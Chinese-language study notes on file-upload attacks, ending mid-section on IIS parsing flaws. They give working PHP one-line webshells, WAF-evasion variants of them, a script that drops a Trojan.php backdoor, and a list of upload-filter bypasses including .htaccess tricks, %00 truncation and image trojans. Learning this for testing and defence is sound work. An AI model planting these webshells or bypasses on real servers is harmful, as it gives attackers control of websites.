## 0X00

定义：通过文件上传可执行的文件或者脚本，就会导致网站被控制/服务器沦陷…

/////////////////////////////////

## 一句话木马

### Webshell

```
webshell 就是以网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。

顾名思义，`web`的含义是显然需要服务器开放 web 服务，`shell` 的含义是取得对服务器某种程度上操作权限。webshell 常常被称为入侵者通过网站端口对网站服务器的某种程度上操作的权限。由于 webshell 其大多是以动态脚本的形式出现，也有人称之为网站的后门工具。

一句话木马、小马、大马都可以叫 webshell。
//一句话木马就是只需要一行代码的木马，短短一行代码，就能做到和大马相当的功能。
//小马体积小，容易隐藏，隐蔽性强,不过功能少，一般只有上传等功能.
//大马功能丰富，体积大。
```

```
webshell 调试三部曲：
1. 把函数写在 php 文件中，看能否执行
2. 写成 $_GET[''] 方式传入命令，看能否执行
3. 写成 $_POST['']方式传入命令，能能否执行命令
```

assert()和eval()

```php
assert()函数用于检查一个表达式的结果是否为true，如果表达式的结果为false，则会触发一个致命错误。它主要用于调试和测试目的。在开启断言（assertion）的情况下，攻击者可能利用assert()来执行任意的PHP代码
//给 assert() 函数传入字符串参数，这个特性在 7.1开始 禁用，在 8.0 版本时会被彻底删除。
//但是可以传入phpinfo(),system('command')，因为这是函数而不是字符串
    
eval()函数用于将一个字符串作为PHP代码进行解析和执行。这意味着可以在运行时动态生成并执行代码。
```



```php
PHP-webs hell.php
<?php @eval($_POST['shell']);?>
//首先存在一个名为shell的变量，shell的取值为HTTP的POST方式。Web服务器对shell取值以后，然后通过eval()函数执行shell里面的内容。
//超全局变量方括号内必须打引号。
为什么使用post?
/*
1.存在长度限制：特定的浏览器及服务器会对通过get方法提交的字符串有一定的限制。
2.是当网站管理员查log的时候，会看到明文的get请求参数，容易被发现,相比之下，post请求敏感内容不容易被发现。所以最好把get方法换成post方法。
*/

//利用
访问一句话木马文件，然后post传入shell=phpinfo();
菜刀：http://127.0.0.1/webshell.php 密码shell
```

### waf绕过

here is a source code example for a WAF

https://blog.csdn.net/qq_29647709/article/details/81474779

```php
<?php  
$a="TR"."Es"."sA";  
$b=strtolower($a);  
$c=strrev($b);  
@$c($_POST['shell']);  
?>
    
//another
$a=base64_decode("YXNzZXJ0");  
@a($_POST['shell']);  
```

变量储存了函数名，字符串拼接、大小写混淆、字符串逆序，base64编码组合

```php
<?php  
function fun($a){  
    @eval($a);  
}  
@fun($_POST['shell']);  
?>
```

function自定义函数，然后函数来调用eval函数

More：

**create_function函数**

```php
<?php
$newfunc = create_function('$a,$b', 'return "ln($a) + ln($b) = " . log($a * $b);');
echo "New anonymous function: $newfunc\n";
echo $newfunc(2, M_E) . "\n";
?>
//
create_function(string $args,  string $code)
string $args 声明的函数变量部分
string $code 执行的方法代码部分，create_function() 函数会在内部执行 eval() 
```

result

```php
New anonymous function: lamvda_1
ln(2)+ln(2.7)=1.6
//使用 create_function()构造了一个lambda样式的匿名函数-lamvda_1
```

因此可以使用匿名函数create_function()然后调用

```
<?php 
$fun = create_function('',$_POST['shell']);
$fun();
?>
```

**call_user_func()函数**

```php
<?php
@call_user_func(assert,$_POST['shell']);
//加了@就会忽略错误信息，不会显示具体报错eval 是因为是一个语言构造器而不是一个函数，不能被可变函数调用。
//不能使用eval，因为eval 是因为是一个语言构造器而不是一个函数，不能被可变函数调用，而call_user_func 有两个参数，第一个参数要求是函数。
?>
```

call_user_func()函数的第一个参数是被调动的函数，剩下的参数（可有多个参数）是被调用函数的参数

在测试环境（PHP Version 7.3.4），这个 webshell 是无法回显的

但是

```php
<?php
@call_user_func(assert,phpinfo());
?>
```

可以回显

原因是前者传入的是字符串，asset()函数触发了禁用，但是直接`assert(phpinfo())`传入的参数是函数，所以就不会触发函数禁用，可以正常回显。而如果使用测试环境（PHP Version 7.0.12）就可以了。

**preg_replace() /e函数**-5.5.0及以上被启用被下面的preg_replace_callback() 代替。

--如果在表达式末尾加上一个 e(eval modifier)，则第二个参数就会被当做 php代码执行。

```php
<?php   
    function fun(){  
        return $_POST['shell'];  
    }  
    @preg_replace("/test/e", fun(), "test");  
?>
```

**preg_replace_callback()**

```php
preg_replace_callback('/.+/i', create_function('$arr', 'return assert($arr[0]);'), $_REQUEST['pass']);
```

此 webshell的原理为：通过 `create_function` “创造”一个函数，它接受一个数组，并将数组的第一个元素$arr[0]传入assert。

**传入能生成木马的php文件，让php文件在目录下生成木马文件**

```
<?php
$test='<?php $a=$_POST["cmd"];assert($a); ?>';
file_put_contents("Trojan.php", $test);
?>
//上面这个 webshell 利用函数file_put_contents生成木马文件 Trojan.php 
```

更多payload的研究可以看antsword源码

## 0X01

上传点：

1.中间件

观察中间件，是否有解析漏洞

2.CMS/editor

观察CMS/编辑器是否有上传漏洞

3.常规类

通过目录扫描/会员中心等发现上传点，观察验证方式，是否可以绕过

4.代码审计

##### cheetsheet

1.常见web中间件及其漏洞

[Web中间件常见漏洞总结 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/192063.html)

2.https://navisec.it  /编辑器漏洞手册/

##### 注意：

需要解析漏洞，.htaccess等将文件解析成PHP，asp等可执行文件来执行恶意代码。

##### asp--A**ctive **S**erver **Pages （动态服务器页面）

- asp文件包含文本，HTML，XML和脚本
- 原生支持VB,js 也可以安装脚本引擎支持相应的脚本

- ASP文件中的脚本可以在服务器上执行

## 0X03

##### 验证与绕过

- JS类防护-bp没抓到包就弹框了

不安全，可以禁用js绕过

- 黑名单

规定不允许上传的格式后缀

##### 绕过方式

1.特殊解析后缀

比如再apache服务器下，phtml，php3,php4,php5可以被当作php文件解析。

php，php2，php3，php5，phtml，asp，aspx，ascx，ashx，cer，asa，jsp，jspx）cdx，\x00hh\x46php

2.htaccess

https://blog.csdn.net/solitudi/article/details/116666720

- htaccess是apache服务器的一个配置文件。通过配置可以实现301重定向，自定义404（不显示404 not found而是自定义的界面），改变文件拓展名等功能
- 要启动.htaccess配置文件，需要在服务器的主配置文件将AllowOverride 设置为 All（而不是None）。

<FileMatch "x.png">

SetHandler application/x-httpd-php

</FileMatch>

<FileMatch "x.png">意思是x.png解析成php文件

意思是设置当前目录所有文件都使用PHP解析，那么无论上传任何文件，只要文件内容符合PHP语言代码规范，就会当做PHP执行

实现：先上传.htaccess配置文件，然后上传一张x.png文件即可执行

3.大小写绕过

服务器端没有对后缀进行统一大小写转换，因此可以大小写绕过，同时Windows系统对后缀的大小写不敏感，因此仍然会解析。

4.点绕过test.php./test.asp.

当将点放在文件结尾的时候，会触发**Windows**的命名规范问题，生成文件的时候结尾的点会被去除。

5.空格绕过---test.php_/test.asp_（下划线代表空格）

同点绕过

6.::$DATA--不检测后缀名1.php::$DATA

**Windows**中在文件名后加上::$DATA会将数据当成文件流处理，不会检测后缀名，因此可以绕过。

7.双写后缀

服务器如果采取单次后缀替换，那么可以双写绕过

8.配合解析漏洞

- 白名单

规定可以上传的文件后缀

绕过方式

1.MIME绕过

服务器检查MIME类型，也就是检查http request中的content-type字段判断上传文件是否合法

可以burp抓包修改content-type即可

2.%00截断XXX.php%00.jpg--验证jpg，保存为xxx.php

%00是空字符，程序执行到%00后，会当作结束符，后面的数据被忽略。

利用方式：文件拓展名验证的时候包括%00，但是保存到本地的时候%00就会截断文件名，只保留%00之前的内容

条件

- php版本低于5.3.4
- 关闭magic_quotes_gpc

 

- 其他检测和绕过方式


1.文件头检测

图片的格式通常检测文件头(文件开头的一段二进制码)

2.二次渲染

上传图片后，网站会对图片进行二次处理，比如图片尺寸，格式等等，并且会对里面的内容二次替换更新

从而让合规的图片在网站上显示出来

3.条件竞争-less 18

条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。

源代码存在校验，但是先上传在校验，如果符合就会重命名文件，不符合就会删除文件。

利用:在删除之前访问文件，访问过程中无法删除，因此可以实现条件竞争

4.exit_imagetype()

服务器通过这个函数检测上传的图片类型是否为白名单图片格式，可以制作图片马绕过。

 

******如何制作图片马**********************

1.文本/十六进制格式编辑图片

2.cmd

copy 1.jpg/b+2.php/a 3.jpg

其中/b是二进制形式打开，/a是ascii方式打开

***********************************************

 

## 5.解析漏洞

服务器应用程序将某些后缀的文件解析成网站脚本，因此可以利用从而实现控制网站

1.iis解析漏洞

iis5.0/6.0

a.目录解析

asp文件名的文件夹下的任何文件都会被当作asp文件执行

b.文件解析

1.asp;.jpg解析成1.asp

c.修复

1）上传文件重命名

2）不允许创建目录

3）限制上传目录的执行权限，不允许执行脚本

iis7.0/7.5